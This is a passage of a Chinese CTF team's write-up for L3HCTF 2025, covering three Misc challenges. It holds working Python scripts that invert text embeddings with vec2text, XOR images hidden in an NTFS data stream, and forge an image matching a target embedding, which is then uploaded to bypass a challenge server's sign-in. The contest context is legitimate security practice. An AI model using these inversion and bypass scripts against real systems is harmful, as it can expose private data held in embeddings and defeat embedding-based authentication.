---
title: "2025 L3HCTF SU WriteUp"
date: 2025-07-13T20:21:10+00:00
author: "SUer"
comments: false
tags:
  - "L3HCTF"
toc: |
  <nav id="TableOfContents"><ul><li><a href="#misc">Misc</a><ul><li><a href="#learnrag">LearnRag</a></li><li><a href="#量子双生影">量子双生影</a></li><li><a href="#please-sign-in">Please Sign In</a></li><li><a href="#paperback">PaperBack</a></li><li><a href="#why-not-read-it-out">Why not read it out?</a></li></ul></li><li><a href="#web">Web</a><ul><li><a href="#赛博侦探">赛博侦探</a></li><li><a href="#gogogo出发喽">gogogo出发喽</a></li><li><a href="#best_"><strong>best_profile</strong></a></li><li><a href="#gateway_advance">gateway_advance</a></li><li><a href="#tellmewhy">Tellmewhy</a></li><li><a href="#lookingmyeyes">LookingMyEyes</a></li></ul></li><li><a href="#reverse">Reverse</a><ul><li><a href="#temporalparadox">TemporalParadox</a></li><li><a href="#ez_android">ez_android</a></li><li><a href="#终焉之门">终焉之门</a></li><li><a href="#obfuscate">obfuscate</a></li><li><a href="#easyvm">easyvm</a></li><li><a href="#snake">snake</a></li><li><a href="#awayout2">AWayOut2</a></li></ul></li><li><a href="#pwn">Pwn</a><ul><li><a href="#heack">Heack</a></li><li><a href="#heack_revenge">Heack_revenge</a></li><li><a href="#library">Library</a></li></ul></li><li><a href="#crypto">Crypto</a><ul><li><a href="#math_problem">math_problem</a></li><li><a href="#rrrsssaaa">RRRSSSAAA</a></li><li><a href="#ezecdsa">EzECDSA</a></li></ul></li></ul></nav>
---

<p>感谢 L3H_Sec 的师傅们精心准备的比赛！本次L3HCTF我们 SU 取得了 第一名🏆 的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_<a href=mailto:xctf@126.com>xctf@126.com</a> 或者直接联系baozongwi QQ:2405758945。</p><p>以下是我们 SU 本次 2025 L3HCTF的 WriteUp。</p>

<!--more-->

<p><img src=https://su-team.cn/img/2025-L3HCTF/1.png alt=img></p><h1 id=misc>Misc</h1><h2 id=learnrag>LearnRag</h2><p><a href=https://github.com/vec2text/vec2text>https://github.com/vec2text/vec2text</a></p><p><a href=https://arxiv.org/html/2401.12192v4>https://arxiv.org/html/2401.12192v4</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>vec2text</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>torch</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>transformers</span> <span class=kn>import</span> <span class=n>AutoModel</span><span class=p>,</span> <span class=n>AutoTokenizer</span><span class=p>,</span> <span class=n>PreTrainedTokenizer</span><span class=p>,</span> <span class=n>PreTrainedModel</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pickle</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>RagData</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>embedding_model</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>embeddings</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>embedding_model</span> <span class=o>=</span> <span class=n>embedding_model</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>embeddings</span> <span class=o>=</span> <span class=n>embeddings</span> <span class=ow>or</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_gtr_embeddings</span><span class=p>(</span><span class=n>text_list</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                       <span class=n>encoder</span><span class=p>:</span> <span class=n>PreTrainedModel</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                       <span class=n>tokenizer</span><span class=p>:</span> <span class=n>PreTrainedTokenizer</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>torch</span><span class=o>.</span><span class=n>Tensor</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>inputs</span> <span class=o>=</span> <span class=n>tokenizer</span><span class=p>(</span><span class=n>text_list</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                       <span class=n>return_tensors</span><span class=o>=</span><span class=s2>&#34;pt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                       <span class=n>max_length</span><span class=o>=</span><span class=mi>128</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                       <span class=n>truncation</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                       <span class=n>padding</span><span class=o>=</span><span class=s2>&#34;max_length&#34;</span><span class=p>,)</span><span class=o>.</span><span class=n>to</span><span class=p>(</span><span class=s2>&#34;cuda&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>torch</span><span class=o>.</span><span class=n>no_grad</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>model_output</span> <span class=o>=</span> <span class=n>encoder</span><span class=p>(</span><span class=n>input_ids</span><span class=o>=</span><span class=n>inputs</span><span class=p>[</span><span class=s1>&#39;input_ids&#39;</span><span class=p>],</span> <span class=n>attention_mask</span><span class=o>=</span><span class=n>inputs</span><span class=p>[</span><span class=s1>&#39;attention_mask&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>hidden_state</span> <span class=o>=</span> <span class=n>model_output</span><span class=o>.</span><span class=n>last_hidden_state</span>
</span></span><span class=line><span class=cl>        <span class=n>embeddings</span> <span class=o>=</span> <span class=n>vec2text</span><span class=o>.</span><span class=n>models</span><span class=o>.</span><span class=n>model_utils</span><span class=o>.</span><span class=n>mean_pool</span><span class=p>(</span><span class=n>hidden_state</span><span class=p>,</span> <span class=n>inputs</span><span class=p>[</span><span class=s1>&#39;attention_mask&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>embeddings</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>encoder</span> <span class=o>=</span> <span class=n>AutoModel</span><span class=o>.</span><span class=n>from_pretrained</span><span class=p>(</span><span class=s2>&#34;sentence-transformers/gtr-t5-base&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>encoder</span><span class=o>.</span><span class=n>to</span><span class=p>(</span><span class=s2>&#34;cuda&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>tokenizer</span> <span class=o>=</span> <span class=n>AutoTokenizer</span><span class=o>.</span><span class=n>from_pretrained</span><span class=p>(</span><span class=s2>&#34;sentence-transformers/gtr-t5-base&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>corrector</span> <span class=o>=</span> <span class=n>vec2text</span><span class=o>.</span><span class=n>load_pretrained_corrector</span><span class=p>(</span><span class=s2>&#34;gtr-base&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;rag_data.pkl&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=n>rag_data</span> <span class=o>=</span> <span class=n>pickle</span><span class=o>.</span><span class=n>load</span><span class=p>(</span><span class=n>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>embeddings</span><span class=o>=</span><span class=n>rag_data</span><span class=o>.</span><span class=n>embeddings</span>
</span></span><span class=line><span class=cl><span class=n>embeddings</span> <span class=o>=</span> <span class=n>torch</span><span class=o>.</span><span class=n>tensor</span><span class=p>(</span><span class=n>embeddings</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 查看数据结构</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>embeddings</span><span class=o>.</span><span class=n>shape</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>vec2text</span><span class=o>.</span><span class=n>invert_embeddings</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=n>embeddings</span><span class=o>=</span><span class=n>embeddings</span><span class=o>.</span><span class=n>cuda</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>    <span class=n>corrector</span><span class=o>=</span><span class=n>corrector</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>num_steps</span><span class=o>=</span><span class=mi>20</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>flag出来的很乱，整理一下L3HCTF{wowthisisembedding}</p><h2 id=量子双生影>量子双生影</h2><p>ntfs数据流隐写+ai二维码变换+双图合并</p><p>首先给出的二维码很明显可以用https://github.com/Tokeii0/LoveLy-QRCode-Scanner 这个项目进行扫描</p><p>给出的提示是</p><p><img src=https://su-team.cn/img/2025-L3HCTF/78cfb26b-4720-4e2a-85ae-2f2468d2394d.png alt=img></p><p>分析解压出的图片很明显和压缩包大小不符合，检索考察的是ntfs数据流隐写，</p><p><img src=https://su-team.cn/img/2025-L3HCTF/11994d42-4157-47a8-af08-0e0f8783a497.png alt=img></p><p>解压用ntfsstreamseditor这个工具提取一下得到另外一个图片，分析发现是两个图片进行了xor用现成工具或写脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>xor_images</span><span class=p>(</span><span class=n>img1_path</span><span class=p>,</span> <span class=n>img2_path</span><span class=p>,</span> <span class=n>output_path</span><span class=o>=</span><span class=s2>&#34;xor_result.png&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># 加载并转换为RGB格式</span>
</span></span><span class=line><span class=cl>    <span class=n>img1</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>img1_path</span><span class=p>)</span><span class=o>.</span><span class=n>convert</span><span class=p>(</span><span class=s2>&#34;RGB&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>img2</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>img2_path</span><span class=p>)</span><span class=o>.</span><span class=n>convert</span><span class=p>(</span><span class=s2>&#34;RGB&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>img1</span><span class=o>.</span><span class=n>size</span> <span class=o>!=</span> <span class=n>img2</span><span class=o>.</span><span class=n>size</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;图片尺寸不一致，无法进行异或运算&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>,</span> <span class=n>h</span> <span class=o>=</span> <span class=n>img1</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s2>&#34;RGB&#34;</span><span class=p>,</span> <span class=p>(</span><span class=n>w</span><span class=p>,</span> <span class=n>h</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 每像素逐位异或</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>r1</span><span class=p>,</span> <span class=n>g1</span><span class=p>,</span> <span class=n>b1</span> <span class=o>=</span> <span class=n>img1</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>r2</span><span class=p>,</span> <span class=n>g2</span><span class=p>,</span> <span class=n>b2</span> <span class=o>=</span> <span class=n>img2</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span><span class=o>.</span><span class=n>putpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>),</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=n>r1</span> <span class=o>^</span> <span class=n>r2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>g1</span> <span class=o>^</span> <span class=n>g2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>b1</span> <span class=o>^</span> <span class=n>b2</span>
</span></span><span class=line><span class=cl>            <span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>result</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=n>output_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 已保存异或图像为: </span><span class=si>{</span><span class=n>output_path</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 示例用法</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>xor_images</span><span class=p>(</span><span class=s2>&#34;1.webp&#34;</span><span class=p>,</span> <span class=s2>&#34;2.webp&#34;</span><span class=p>,</span> <span class=s2>&#34;xor_result.png&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>得到图片还是用项目解码</p><p><img src=https://su-team.cn/img/2025-L3HCTF/dbaa88a4-49fe-46ba-b209-f25d43fd9476.png alt=img></p><h2 id=please-sign-in>Please Sign In</h2><p>真签到题 ai梭哈点击就送哦内盖</p><p>丢给gpt让gpt生成脚本即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>torch</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>torchvision</span> <span class=kn>import</span> <span class=n>transforms</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>torchvision.models</span> <span class=kn>import</span> <span class=n>shufflenet_v2_x1_0</span><span class=p>,</span> <span class=n>ShuffleNet_V2_X1_0_Weights</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>invert_embedding_to_image</span><span class=p>(</span><span class=n>embedding_path</span><span class=p>,</span> <span class=n>output_path</span><span class=p>,</span> <span class=n>steps</span><span class=o>=</span><span class=mi>500</span><span class=p>,</span> <span class=n>lr</span><span class=o>=</span><span class=mf>0.1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># Load model</span>
</span></span><span class=line><span class=cl>    <span class=n>model</span> <span class=o>=</span> <span class=n>shufflenet_v2_x1_0</span><span class=p>(</span><span class=n>weights</span><span class=o>=</span><span class=n>ShuffleNet_V2_X1_0_Weights</span><span class=o>.</span><span class=n>IMAGENET1K_V1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>model</span><span class=o>.</span><span class=n>fc</span> <span class=o>=</span> <span class=n>torch</span><span class=o>.</span><span class=n>nn</span><span class=o>.</span><span class=n>Identity</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>model</span><span class=o>.</span><span class=n>eval</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Load target embedding</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>embedding_path</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>target_emb</span> <span class=o>=</span> <span class=n>torch</span><span class=o>.</span><span class=n>tensor</span><span class=p>(</span><span class=n>json</span><span class=o>.</span><span class=n>load</span><span class=p>(</span><span class=n>f</span><span class=p>),</span> <span class=n>dtype</span><span class=o>=</span><span class=n>torch</span><span class=o>.</span><span class=n>float32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Initialize trainable image tensor (noise)</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>torch</span><span class=o>.</span><span class=n>randn</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>224</span><span class=p>,</span> <span class=mi>224</span><span class=p>,</span> <span class=n>requires_grad</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>optimizer</span> <span class=o>=</span> <span class=n>torch</span><span class=o>.</span><span class=n>optim</span><span class=o>.</span><span class=n>Adam</span><span class=p>([</span><span class=n>img</span><span class=p>],</span> <span class=n>lr</span><span class=o>=</span><span class=n>lr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>step</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>steps</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>optimizer</span><span class=o>.</span><span class=n>zero_grad</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=c1># Sigmoid to bound pixels between 0 and 1</span>
</span></span><span class=line><span class=cl>        <span class=n>clipped</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>sigmoid</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>emb</span> <span class=o>=</span> <span class=n>model</span><span class=p>(</span><span class=n>clipped</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>loss</span> <span class=o>=</span> <span class=n>torch</span><span class=o>.</span><span class=n>nn</span><span class=o>.</span><span class=n>functional</span><span class=o>.</span><span class=n>mse_loss</span><span class=p>(</span><span class=n>emb</span><span class=p>,</span> <span class=n>target_emb</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>loss</span><span class=o>.</span><span class=n>backward</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>optimizer</span><span class=o>.</span><span class=n>step</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>step</span> <span class=o>%</span> <span class=mi>50</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;Step </span><span class=si>{</span><span class=n>step</span><span class=si>}</span><span class=s1>, Loss </span><span class=si>{</span><span class=n>loss</span><span class=o>.</span><span class=n>item</span><span class=p>()</span><span class=si>:</span><span class=s1>.6e</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Convert to image and save</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=p>(</span><span class=n>clipped</span><span class=o>.</span><span class=n>detach</span><span class=p>()</span><span class=o>.</span><span class=n>squeeze</span><span class=p>()</span><span class=o>.</span><span class=n>permute</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span><span class=o>.</span><span class=n>cpu</span><span class=p>()</span><span class=o>.</span><span class=n>numpy</span><span class=p>()</span> <span class=o>*</span> <span class=mi>255</span><span class=p>)</span><span class=o>.</span><span class=n>astype</span><span class=p>(</span><span class=s1>&#39;uint8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>inv_image</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>fromarray</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>inv_image</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=n>output_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Inverted image saved to &#39;</span><span class=si>{</span><span class=n>output_path</span><span class=si>}</span><span class=s2>&#39;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload_and_print_response</span><span class=p>(</span><span class=n>image_path</span><span class=p>,</span> <span class=n>server_url</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>image_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;File &#39;</span><span class=si>{</span><span class=n>image_path</span><span class=si>}</span><span class=s2>&#39; not found.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>image_path</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>files</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;file&#39;</span><span class=p>:</span> <span class=n>f</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>server_url</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>files</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Server response:&#34;</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>json</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>ValueError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Server response (text):&#34;</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>EMB_PATH</span> <span class=o>=</span> <span class=s1>&#39;embedding.json&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>OUT_IMG</span> <span class=o>=</span> <span class=s1>&#39;inverted_image.png&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>SIGNIN_URL</span> <span class=o>=</span> <span class=s1>&#39;http://1.95.8.146:50001/signin/&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Step 1: Invert embedding to image</span>
</span></span><span class=line><span class=cl>    <span class=n>invert_embedding_to_image</span><span class=p>(</span><span class=n>EMB_PATH</span><span class=p>,</span> <span class=n>OUT_IMG</span><span class=p>,</span> <span class=n>steps</span><span class=o>=</span><span class=mi>500</span><span class=p>,</span> <span class=n>lr</span><span class=o>=</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Step 2: Upload image and print the flag or failure</span>
</span></span><span class=line><span class=cl>    <span class=n>upload_and_print_response</span><span class=p>(</span><span class=n>OUT_IMG</span><span class=p>,</span> <span class=n>SIGNIN_URL</span><span class=p>)</span>
